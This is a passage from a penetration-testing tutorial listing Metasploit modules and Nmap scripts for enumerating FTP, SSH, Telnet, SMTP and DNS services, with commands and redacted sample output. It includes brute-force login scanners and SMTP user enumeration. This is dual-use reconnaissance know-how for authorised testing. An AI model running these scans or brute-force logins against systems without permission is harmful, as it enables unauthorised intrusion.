</span><span class='line'>"vsftpd 2.0.4+ (ext.3)"
</span><span class='line'>"vsftpd 2.0.5"
</span><span class='line'>"vsftpd 2.0.8 or later"
</span><span class='line'>"vsftpd 2.2.2"
</span><span class='line'>"vsftpd 3.0.2"
</span><span class='line'>"vsftpd (before 2.0.8) or WU-FTPD"
</span><span class='line'>"WU-FTPD or MIT Kerberos ftpd 5.60"
</span><span class='line'>"WU-FTPD or MIT Kerberos ftpd 6.00L</span></code></pre></td></tr></table></div></figure>


<p><strong>Metasploit</strong> provides</p>

<ol>
<li> <strong>FTP Version Scanner</strong> which detects the ftp version.
This can be done using
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/ftp/ftp_version
</span><span class='line'>services -p 21 -R</span></code></pre></td></tr></table></div></figure>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[*] 172.16.xx.xx:21 FTP Banner: '220 BDL095XXXX FTP server ready.\x0d\x0a'
</span><span class='line'>[*] 172.16.xx.xx:21 FTP Banner: '220 (vsFTPd 2.0.5)\x0d\x0a'
</span><span class='line'>[*] 172.16.xx.xx:21 FTP Banner: '220 (vsFTPd 2.0.5)\x0d\x0a'
</span><span class='line'>[*] 172.16.xx.xx:21 FTP Banner: '220 (vsFTPd 2.0.5)\x0d\x0a'
</span><span class='line'>[*] 172.16.xx.xx:21 FTP Banner: '220 ProFTPD 1.3.2 Server (ProFTPD Default Installation) [172.16.110.51]\x0d\x0a'
</span><span class='line'>[*] 172.16.xx.xx:21 FTP Banner: '220 pSCn-D1 FTP server (Version 4.2 Tue Feb 19 19:37:47 CST 2013) ready.\x0d\x0a'
</span><span class='line'>[*] 172.16.xx.xx:21 FTP Banner: '220 pSCn-Dev FTP server (Version 4.2 Tue Feb 19 19:37:47 CST 2013) ready.\x0d\x0a'
</span><span class='line'>[*] Auxiliary module execution completed</span></code></pre></td></tr></table></div></figure>
</li>

<li><strong>Anonymous FTP Access Detection</strong> which detect anonymous (read/write) FTP server access.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/ftp/anonymous
</span><span class='line'>services -p 21 -R</span></code></pre></td></tr></table></div></figure>
A sample of results is
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[+] 10.10.xx.xx:21 - Anonymous READ/WRITE (220 Microsoft FTP Service)
</span><span class='line'>[+] 10.10.xx.xx:21 - Anonymous READ (220 Microsoft FTP Service)
</span><span class='line'>[+] 10.10.xx.xx:21 - Anonymous READ (220 Microsoft FTP Service)</span></code></pre></td></tr></table></div></figure>
</li>
 
<li><strong>FTP Authentication Scanner</strong> which is a FTP Authentication Scanner which will test FTP logins on a range of machines and report successful logins.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/ftp/ftp_login
</span><span class='line'>services -p 21 -R</span></code></pre></td></tr></table></div></figure>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Yet to run</span></code></pre></td></tr></table></div></figure>
</li>
<li><strong>FTP Bounce Port Scanner</strong> which enumerate TCP services via the FTP bounce PORT/LIST method.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/portscan/ftpbounce</span></code></pre></td></tr></table></div></figure></li>
</ol>


<p><strong>Nmap</strong> has</p>

<ol>
<li><a href="https://nmap.org/nsedoc/scripts/ftp-anon.html">ftp-anon.nse</a> : Checks if an FTP server allows anonymous logins. If anonymous is allowed, gets a directory listing of the root directory and highlights writeable files.
<br>
<br>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -sV --script ftp-anon -p 21 10.10.xx.xx
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-03 21:53 IST
</span><span class='line'>Nmap scan report for 10.10.xx.xx
</span><span class='line'>Host is up (0.018s latency).
</span><span class='line'>PORT   STATE SERVICE VERSION
</span><span class='line'>21/tcp open  ftp     vsftpd 2.2.2
</span><span class='line'>| ftp-anon: Anonymous FTP login allowed (FTP code 230)
</span><span class='line'>|_drwxr-xr-x    2 0        0            4096 Jun 25  2011 pub
</span><span class='line'>Service Info: OS: Unix</span></code></pre></td></tr></table></div></figure>
</li>

<li><a href="https://nmap.org/nsedoc/scripts/ftp-brute.html">ftp-brute.nse</a> : Performs brute force password auditing against FTP servers.</li>
<li><a href="https://nmap.org/nsedoc/scripts/ftp-bounce.html">ftp-bounce.nse</a> : Checks to see if an FTP server allows port scanning using the FTP bounce method.</li>
</ol>


<h3>SSH | Port 22</h3>

<p><strong>Metasploit</strong> has</p>

<ol>
<li> <strong>SSH Version Scanner</strong> which detects SSH version.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/ssh/ssh_version
</span><span class='line'>services -p 22 -u -R</span></code></pre></td></tr></table></div></figure>
A Sample output
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[*] 10.23.xx.xx:22 SSH server version: SSH-2.0-OpenSSH_5.8 ( service.version=5.8 service.vendor=OpenBSD service.family=OpenSSH service.product=OpenSSH )
</span><span class='line'>[*] 10.23.xx.xx:22 SSH server version: SSH-2.0-9nroL
</span><span class='line'>[*] 10.23.xx.xx:22 SSH server version: SSH-1.99-Cisco-1.25 ( service.version=1.25 service.vendor=Cisco service.product=SSH os.vendor=Cisco os.product=IOS os.certainty=0.8 )</span></code></pre></td></tr></table></div></figure>
</li>
There's a auxilary module to try 
<li><strong>SSH Brute force</strong> which is SSH Login Check Scanner will test ssh logins on a range of machines and report successful logins. Caution: BruteForce.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/ssh/ssh_login
</span><span class='line'>services -p 22 -u -R</span></code></pre></td></tr></table></div></figure>
</li>
</ol>


<p><strong>Nmap</strong> has three NSE</p>

<ol>
<li><a href="https://nmap.org/nsedoc/scripts/ssh2-enum-algos.html">ssh2-enum-algos.nse</a> Reports the number of algorithms (for encryption, compression, etc.) that the target SSH2 server offers. If verbosity is set, the offered algorithms are each listed by type.
<br>
<br>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap --script ssh2-enum-algos -p 22 -n 103.206.xx.xx
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-03 22:04 IST
</span><span class='line'>Nmap scan report for 103.206.xx.xx
</span><span class='line'>Host is up (0.018s latency).
</span><span class='line'>PORT   STATE SERVICE
</span><span class='line'>22/tcp open  ssh
</span><span class='line'>| ssh2-enum-algos: 
</span><span class='line'>|   kex_algorithms: (4)
</span><span class='line'>|       diffie-hellman-group-exchange-sha256
</span><span class='line'>|       diffie-hellman-group-exchange-sha1
</span><span class='line'>|       diffie-hellman-group14-sha1
</span><span class='line'>|       diffie-hellman-group1-sha1
</span><span class='line'>|   server_host_key_algorithms: (2)
</span><span class='line'>|       ssh-dss
</span><span class='line'>|       ssh-rsa
</span><span class='line'>|   encryption_algorithms: (9)
</span><span class='line'>|       aes128-ctr
</span><span class='line'>|       aes192-ctr
</span><span class='line'>|       aes256-ctr
</span><span class='line'>|       aes128-cbc
</span><span class='line'>|       aes192-cbc
</span><span class='line'>|       aes256-cbc
</span><span class='line'>|       blowfish-cbc
</span><span class='line'>|       3des-cbc
</span><span class='line'>|       none
</span><span class='line'>|   mac_algorithms: (2)
</span><span class='line'>|       hmac-sha1
</span><span class='line'>|       hmac-md5
</span><span class='line'>|   compression_algorithms: (1)
</span><span class='line'>|_      none
</span><span class='line'>
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 0.65 seconds</span></code></pre></td></tr></table></div></figure>
</li>

<li><a href="https://nmap.org/nsedoc/scripts/ssh-hostkey.html">ssh-hostkey.nse</a>: Shows SSH hostkeys
<br>
<br>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap --script ssh-hostkey -p 22 -n 103.206.xx.xx --script-args ssh_hostkey=full
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-03 22:07 IST
</span><span class='line'>Nmap scan report for 103.206.xx.xx
</span><span class='line'>Host is up (0.019s latency).
</span><span class='line'>PORT   STATE SERVICE
</span><span class='line'>22/tcp open  ssh
</span><span class='line'>| ssh-hostkey: 
</span><span class='line'>|   ssh-dss AAAAB3NzaC1kc3MAAACBAOohTo8BeSsafI78mCTp7vz1ETkdSXNj8wgrYMD+DOEDpdfMEqYJOFPUWiyK0HrkyrP7UyODp9SEcrOzem98iDUgvPZFfSRhKpdTktQtt9+9mzDpfHgqryD04o2JvjZc6HlMwZToulurZwgt0+npep8Asb32lRCGAkFpPA7r3NdfAAAAFQDypzDnHTTgcy/vQNUDe+RlnFxX0wAAAIAXBBnv/P1RyzGdGM+JX2tbM6gJvC4WNoq7Okdh1ZH2Rxn1plU+oTt189ZI5UcR67x504o5fXVZ0pj3yJh6yMQFfsw89iSbTGmM6V1wYnq+s1Lz83XvgHIepV0OdOj2HE4tCytS6md0udLSio6RlWTVG/8vFrwb/C2KoL36JiIABgAAAIAUTOQm2+LVNqISuZT/doDbz5H89dCbLyL0uNiPRGW3XGjsZrW/iyvN/FQ1Lz0vai1db3UPbkNvhQNhOIJtAYClyQg1bTjvBCV2YvG9P91Ljyl6avSUoPEDg7h46E90TpneFa0tRf+V3RBC4KbXHrelgHye+2ZUkaebOmsRt2h4sQ==
</span><span class='line'>|_  ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIRocXKgi0l3kZeVNEPlMXBBDj4WYAPFzNgf63+e/RMN5DSYz4AmVw1V8o+gsaL3mCeMwRdMfPCVlDdFPRDbZhyXNiG2vstc+gbeOHyDaLuQJVMF/++M8Yw9GWr7dOOA9zUfRkYVrQT53bfYzSpiulZpAbnkY0X5Ma40aO56Sq4H1NNqb7ZBdCWmder3veBq+6R9z+xSY0ji5Csr52bIl2Bka36KfYx325rrUP//lWDUDwK+hQ8jL9EjP884uPflRJPqdxoWLK001exSPHmcZOFNCeb2TQSkTbJVIh5Qg55eel2d0f/YZe24b6SalaANsZHt9MyG6Q5DNbtWvV2ixV
</span><span class='line'>
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 3.02 seconds</span></code></pre></td></tr></table></div></figure>
</li>

<li><a href="https://nmap.org/nsedoc/scripts/sshv1.html">sshv1.nse</a>: Checks if an SSH server supports the obsolete and less secure SSH Protocol Version 1.
<br>
<br>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap --script sshv1 -p 22 -n 203.134.xx.xx
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-03 23:16 IST
</span><span class='line'>Nmap scan report for 203.134.xx.xx
</span><span class='line'>Host is up (0.042s latency).
</span><span class='line'>PORT   STATE SERVICE
</span><span class='line'>22/tcp open  ssh
</span><span class='line'>|_sshv1: Server supports SSHv1</span></code></pre></td></tr></table></div></figure>
</li>
</ol>


<h3>Telnet | Port 23</h3>

<p><strong>Metasploit</strong> has</p>

<ol>
<li><strong>Telnet version</strong> which detects telnet version.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/telnet/telnet_version
</span><span class='line'>services -p 23 -u -R</span></code></pre></td></tr></table></div></figure>
Sample Output
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[*] 10.13.xx.xx:23 TELNET (ttyp0)\x0d\x0a\x0d\x0alogin:
</span><span class='line'>[*] 10.13.xx.xx:23 TELNET User Access Verification\x0a\x0aUsername:</span></code></pre></td></tr></table></div></figure>
One sad thing is telnet_version overwrites the Nmap banner, which is most probably not good. Need to check how we can avoid this. may be not run version modules?

We could have used nmap banners for telnet for example: below for the SNMP modules. As routers/switches are mostly uses SNMP. 
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>10.23.xx.xx   23    tcp    telnet      open   Usually a Cisco/3com switch
</span><span class='line'>10.23.xx.xx   23    tcp    telnet      open   Aruba switch telnetd
</span><span class='line'>10.87.xx.xx    23    tcp    telnet      open   Dell PowerConnect switch telnetd
</span><span class='line'>10.10.xx.xx   23    tcp    telnet      open   Cisco router telnetd
</span><span class='line'>10.10.xx.xx    23    tcp    telnet      open   Pirelli NetGate VOIP v2 broadband router telnetd</span></code></pre></td></tr></table></div></figure>
</li>

<li><strong>Telnet Login Check Scanner</strong> which will test a telnet login on a range of machines and report successful logins.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/telnet/telnet_login
</span><span class='line'>services -p 23 -u -R</span></code></pre></td></tr></table></div></figure>
</li>
</ol>


<p><strong>Nmap</strong> has two NSEs</p>

<ol>
<li><a href="https://nmap.org/nsedoc/scripts/telnet-brute.html">telnet-brute.nse</a> : Performs brute-force password auditing against telnet servers.</li>
and 
<li><a href="https://nmap.org/nsedoc/scripts/telnet-encryption.html">telnet-encryption.nse</a> : Determines whether the encryption option is supported on a remote telnet server. </li>
</ol>


<h3>SMTP | Port 25 and Submission Port 587</h3>

<p><strong>Metasploit</strong> has</p>

<ol>
<li><strong>SMTP_Version</strong> which is a SMTP Banner Grabber.

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/smtp/smtp_version
</span><span class='line'>services -p 25 -u -R</span></code></pre></td></tr></table></div></figure>

Sample Output
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[*] 10.10.xx.xx:25 SMTP 220 xxxx.example.com Microsoft ESMTP MAIL Service, Version: 6.0.3790.4675 ready at  Thu, 3 Mar 2016 18:22:44 +0530 \x0d\x0a
</span><span class='line'>[*] 10.10.xx.xx:25 SMTP 220 smtpsrv.example.com ESMTP Sendmail; Thu, 3 Mar 2016 18:22:39 +0530\x0d\x0a</span></code></pre></td></tr></table></div></figure>
</li>

<li><strong>SMTP Open Relays</strong> which tests if an SMTP server will accept (via a code 250) an e-mail by using a variation of testing methods
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/smtp/smtp_relay
</span><span class='line'>services -p 25 -u -R</span></code></pre></td></tr></table></div></figure>
You might want to change MAILFROM and MAILTO, if you want to see if they are actual open relays client might receive emails.
<br>
<br>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[+] 172.16.xx.xx:25 - Potential open SMTP relay detected: - MAIL FROM:&lt;sender@example.com&gt; -&gt; RCPT TO:&lt;target@example.com&gt;
</span><span class='line'>[*] 172.16.xx.xx:25 - No relay detected
</span><span class='line'>[+] 172.16.xx.xx:25 - Potential open SMTP relay detected: - MAIL FROM:&lt;sender@example.com&gt; -&gt; RCPT TO:&lt;target@example.com&gt;</span></code></pre></td></tr></table></div></figure>

</li>

<li><strong>SMTP User Enumeration Utility</strong> which allows allow the enumeration of users: VRFY (confirming the names of valid users) and EXPN (which reveals the actual address of users aliases and lists of e-mail (mailing lists)). Through the implementation of these SMTP commands can reveal a list of valid users. User files contains only Unix usernames so it skips the Microsoft based Email SMTP Server. This can be changed using UNIXONLY option and custom user list can also be provided.

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/smtp/smtp_enum
</span><span class='line'>services -p 25 -u -R</span></code></pre></td></tr></table></div></figure>


Sample Output
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[*] 10.10.xx.xx:25 Skipping microsoft (220 ftpsrv Microsoft ESMTP MAIL Service, Version: 6.0.3790.4675 ready at  Thu, 3 Mar 2016 18:49:49 +0530 )
</span><span class='line'>[+] 10.10.xx.xx:25 Users found: adm, admin, avahi, avahi-autoipd, bin, daemon, fax, ftp, games, gdm, gopher, haldaemon, halt, lp, mail, news, nobody, operator, postgres, postmaster, sshd, sync, uucp, webmaster, www
</span><span class='line'>[+] 10.10.xx.xx:25 Users found: adm, avahi, avahi-autoipd, backup, bin, daemon, fax, ftp, games, gdm, gopher, haldaemon, halt, lp, mail, news, nobody, operator, postgres, postmaster, sshd, sync, uucp, webmaster, www</span></code></pre></td></tr></table></div></figure>
</li>
</ol>


<p><strong>Nmap NSE</strong> has</p>

<ol>
<li><a href="https://nmap.org/nsedoc/scripts/smtp-brute.html">smtp-brute.nse</a> : Performs brute force password auditing against SMTP servers using either LOGIN, PLAIN, CRAM-MD5, DIGEST-MD5 or NTLM authentication.</li>
<li><a href="https://nmap.org/nsedoc/scripts/smtp-commands.html">smtp-commands.nse</a> : Attempts to use EHLO and HELP to gather the Extended commands supported by an SMTP server.</li>
<li><a href="https://nmap.org/nsedoc/scripts/smtp-enum-users.html">smtp-enum-users.nse</a> Attempts to enumerate the users on a SMTP server by issuing the VRFY, EXPN or RCPT TO commands. The goal of this script is to discover all the user accounts in the remote system. Similar to SMTP_ENUM in metasploit.</li>
<li><a href="https://nmap.org/nsedoc/scripts/smtp-open-relay.html">smtp-open-relay.nse</a> Attempts to relay mail by issuing a predefined combination of SMTP commands. The goal of this script is to tell if a SMTP server is vulnerable to mail relaying.
<br>
<br>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -iL email_servers -v --script=smtp-open-relay -p 25
</span><span class='line'>Nmap scan report for 10.10.xx.xx
</span><span class='line'>Host is up (0.00039s latency).
</span><span class='line'>PORT     STATE  SERVICE
</span><span class='line'>25/tcp   open   smtp
</span><span class='line'>| smtp-open-relay: Server is an open relay (14/16 tests)
</span><span class='line'>|  MAIL FROM:&lt;&gt; -&gt; RCPT TO:&lt;relaytest@nmap.scanme.org&gt;
</span><span class='line'>|  MAIL FROM:&lt;antispam@nmap.scanme.org&gt; -&gt; RCPT TO:&lt;relaytest@nmap.scanme.org&gt;
</span><span class='line'>|  MAIL FROM:&lt;antispam@sysmailsrv.example.com&gt; -&gt; RCPT TO:&lt;relaytest@nmap.scanme.org&gt;
</span><span class='line'>|  MAIL FROM:&lt;antispam@[10.10.xx.xx]&gt; -&gt; RCPT TO:&lt;relaytest@nmap.scanme.org&gt;
</span><span class='line'>|  MAIL FROM:&lt;antispam@[10.10.xx.xx]&gt; -&gt; RCPT TO:&lt;relaytest%nmap.scanme.org@[10.10.8.136]&gt;
</span><span class='line'>|  MAIL FROM:&lt;antispam@[10.10.xx.xx]&gt; -&gt; RCPT TO:&lt;relaytest%nmap.scanme.org@sysmailsrv.example.com&gt;
</span><span class='line'>|  MAIL FROM:&lt;antispam@[10.10.xx.xx]&gt; -&gt; RCPT TO:&lt;"relaytest@nmap.scanme.org"&gt;
</span><span class='line'>|  MAIL FROM:&lt;antispam@[10.10.xx.xx]&gt; -&gt; RCPT TO:&lt;"relaytest%nmap.scanme.org"&gt;
</span><span class='line'>|  MAIL FROM:&lt;antispam@[10.10.xx.xx]&gt; -&gt; RCPT TO:&lt;"relaytest@nmap.scanme.org"@[10.10.8.136]&gt;
</span><span class='line'>|  MAIL FROM:&lt;antispam@[10.10.xx.xx]&gt; -&gt; RCPT TO:&lt;@[10.10.8.136]:relaytest@nmap.scanme.org&gt;
</span><span class='line'>|  MAIL FROM:&lt;antispam@[10.10.xx.xx]&gt; -&gt; RCPT TO:&lt;@sysmailsrv.example.com:relaytest@nmap.scanme.org&gt;
</span><span class='line'>|  MAIL FROM:&lt;antispam@[10.10.xx.xx]&gt; -&gt; RCPT TO:&lt;nmap.scanme.org!relaytest&gt;
</span><span class='line'>|  MAIL FROM:&lt;antispam@[10.10.xx.xx]&gt; -&gt; RCPT TO:&lt;nmap.scanme.org!relaytest@[10.10.8.136]&gt;
</span><span class='line'>|_ MAIL FROM:&lt;antispam@[10.10.xx.xx]&gt; -&gt; RCPT TO:&lt;nmap.scanme.org!relaytest@sysmailsrv.example.com&gt;
</span><span class='line'>MAC Address: 00:50:56:B2:21:A9 (VMware)</span></code></pre></td></tr></table></div></figure>
</li>
</ol>


<h3>DNS | Port 53</h3>

<p><strong>Metasploit</strong> provides</p>

<ol>

<li><strong>DNS Bruteforce Enumeration</strong>:  which uses a dictionary to perform a bruteforce attack to enumerate hostnames and subdomains available under a given domain
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/gather/dns_bruteforce</span></code></pre></td></tr></table></div></figure>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[+] Host autodiscover.example.com with address 10.10.xx.xx found
</span><span class='line'>[+] Host b2b.example.com with address 10.10.xx.xx found
</span><span class='line'>[+] Host blog.example.com with address 10.10.xx.xx found</span></code></pre></td></tr></table></div></figure></li>

<li><strong>DNS Basic Information Enumeration</strong> : This module enumerates basic DNS information for a given domain. The module gets information regarding to A (addresses), AAAA (IPv6 addresses), NS (name servers), SOA (start of authority) and MX (mail servers) records for a given domain. In addition, this module retrieves information stored in TXT records.

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/gather/dns_info</span></code></pre></td></tr></table></div></figure>

Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[*] Enumerating example.com
</span><span class='line'>[+] example.com - Address 93.184.xx.xx found. Record type: A
</span><span class='line'>[+] example.com - Address 2606:2800:220:1:248:1893:25c8:1946 found. Record type: AAAA
</span><span class='line'>[+] example.com - Name server a.iana-servers.net (199.43.xx.xx) found. Record type: NS
</span><span class='line'>[+] example.com - Name server a.iana-servers.net (2001:500:8c::53) found. Record type: NS
</span><span class='line'>[+] example.com - Name server b.iana-servers.net (199.43.xx.xx) found. Record type: NS
</span><span class='line'>[+] example.com - Name server b.iana-servers.net (2001:500:8d::53) found. Record type: NS
</span><span class='line'>[+] example.com - sns.dns.icann.org (199.4.xx.xx) found. Record type: SOA
</span><span class='line'>[+] example.com - sns.dns.icann.org (64:ff9b::c704:1c1a) found. Record type: SOA
</span><span class='line'>[+] example.com - Text info found: v=spf1 -all . Record type: TXT
</span><span class='line'>[+] example.com - Text info found: $Id: example.com 4415 2015-08-24 20:12:23Z davids $ . Record type: TXT
</span><span class='line'>[*] Auxiliary module execution completed</span></code></pre></td></tr></table></div></figure></li>

<li><strong>DNS Reverse Lookup Enumeration</strong>: This module performs DNS reverse lookup against a given IP range in order to retrieve valid addresses and names.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/gather/dns_reverse_lookup</span></code></pre></td></tr></table></div></figure>
</li>
<li> <strong>DNS Common Service Record Enumeration</strong> : This module enumerates common DNS service records in a given domain.
<br>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/gather/dns_srv_enum
</span><span class='line'>set domain example.com
</span><span class='line'>run
</span><span class='line'>
</span><span class='line'>[*] Enumerating SRV Records for example.com
</span><span class='line'>[+] Host: sipfed.online.lync.com IP: 10.10.xx.xx Service: sipfederationtls Protocol: tcp Port: 5061 Query: _sipfederationtls._tcp.example.com
</span><span class='line'>[+] Host: sipfed.online.lync.com IP: 2a01:XXX:XXXX:2::b Service: sipfederationtls Protocol: tcp Port: 5061 Query: _sipfederationtls._tcp.example.com
</span><span class='line'>[*] Auxiliary module execution completed</span></code></pre></td></tr></table></div></figure></li>

